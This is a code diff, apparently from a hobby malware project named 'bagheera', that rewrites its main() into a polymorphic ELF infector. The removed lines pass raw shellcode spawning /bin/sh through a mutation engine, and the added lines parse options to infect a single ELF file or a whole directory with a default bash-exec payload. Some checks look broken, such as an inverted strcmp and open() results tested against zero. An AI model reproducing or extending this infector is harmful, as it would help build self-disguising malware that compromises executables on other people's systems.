@@ -1,57 +1,118 @@
 #include "src/bagheera.hpp"
 #include "src/includes.hpp"
+#include "src/definitions.h"
+#include "src/helpers.h"
+#include "engine.h"
+#include "infect.h"
 
+extern int errno;
+extern char *optarg;
+extern int opterr, optind;
 
-
-
-int main()
+int main(int argc, char *argv[])
 {
 
-  //srand(1);
-  srand(time(NULL));
+    int opt, input_fd, input_size;
+    opterr = 0;
+    
+    options_t options = { 0,                       // verbose - default: no verbose                    
+                          0,                       // mode - mandatory                                  
+                          default_payload(),       // input - default: 'exec /bin/bash' payload        
+                          default_payload_size(),  // inputsz - default: 'exec /bin/bash' payload size 
+                          1,                       // output - default: stdout                          
+                          -1,                      // elf - default: no file                           
+                          NULL };                  // dir - default: no dir                            
 
-  // input data (in this case a simple string,
-  // although it could be any data buffer)
-  //std::cout << "Creating payload\n";
 
-  //uint8_t payload[] = "Python es solo C pero mas lento y si definir los tipos";
-  
-  uint8_t payload[29] = {
-    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
-    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
-    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
-  };
-  
+    while ((opt = getopt(argc, argv, OPTSTR)) != EOF)
+      switch(opt) {
+    
+        case 'm':
+          if (strcmp(optarg, ENGINE))
+            options.mode = MODE_ENGINE;
+    
+          else if (strcmp(optarg, INFECT))
+            options.mode = MODE_INFECT;
+          
+          else
+            error_verbose(ERR_MODE, basename(argv[0]));
+    
+          break;
 
-  //std::ifstream ifs("hello_world");
-  //std::string payload( (std::istreambuf_iterator<char>(ifs) ),
-                       //(std::istreambuf_iterator<char>()    ) );
-  //std::cout << payload.data() << std::endl;
 
-  // create an instance of the polymorphic
-  // engine,
-  //std::cout << "Creating bangheera PE instance\n";
 
-  CMutagenSPE *speEngine = new CMutagenSPE();
+        case 'i':
+          if (!(input_fd = open(optarg, O_RDONLY)) )
+            error(ERR_INPUT_OPEN);
 
-  // a pointer to the generated decryption
-  // function will be placed here
-  //std::cout << "Creating pointer to the generated decryption function\n";
-  unsigned char *lpcDecryptionProc = NULL;
+          options.inputsz = lseek(input_fd, 0, SEEK_END);
+          lseek(input_fd, 0, SEEK_SET);
 
-  // the size of the decryption code (and
-  // its encrypted payload) will go here
-  //std::cout << "Defining size of the decryption code\n";
-  unsigned long dwDecryptionProcSize = 0;
+          options.input = (char *) malloc(options.inputsz);
+          if (options.input == NULL )
+            error(ERR_INPUT_MALLOC);
+          
+          if (read(input_fd, options.input, options.inputsz) != options.inputsz)
+            error(ERR_INPUT_READ);
 
-  // encrypt the input data and dynamically
-  // generate a decryption function
-  //std::cout << "Call PolySPE function and encrypt data\n";
-  speEngine->PolySPE((unsigned char*)payload, sizeof(payload), &lpcDecryptionProc, &dwDecryptionProcSize);
+          break;
 
- 
-  return 0;
-  
+
+
+        case 'o':
+          if (!(options.output = open(optarg, O_RDWR)) )
+            error(ERR_FOPEN_OUTPUT);
+          break;
+
+
+
+        case 'e':
+          if (!(options.elf = open(optarg, O_RDWR|O_SYNC)) )
+            error(ERR_FOPEN_ELF);
+          break;
+
+
+
+        case 'd':
+          options.dir = opendir(optarg);
+
+          if (options.dir == NULL)
+            error(ERR_DIR_OPEN);
+          
+          break;
+            
+
+
+        case 'v':
+          options.verbose = 1;
+          break;
+
+
+
+        case 'h':
+        default:
+          usage(basename(argv[0]), opt);
+          break;
+      }
+
+
+    if ( !options.mode )
+      error(ERR_MODE);
+
+    if (options.mode == MODE_INFECT)
+    {
+      if (options.elf == -1 && options.dir != NULL)
+        directory_infection(&options);      
+      else if (options.elf != -1 && options.dir == NULL)  
+        elf_infection(&options);
+      else
+        error(ERR_MODE_INFECT_OPTIONS);
+    }
+    else 
+    {
+      engine_execution(&options);
+    }
+
+    return EXIT_SUCCESS;
 }
-
 
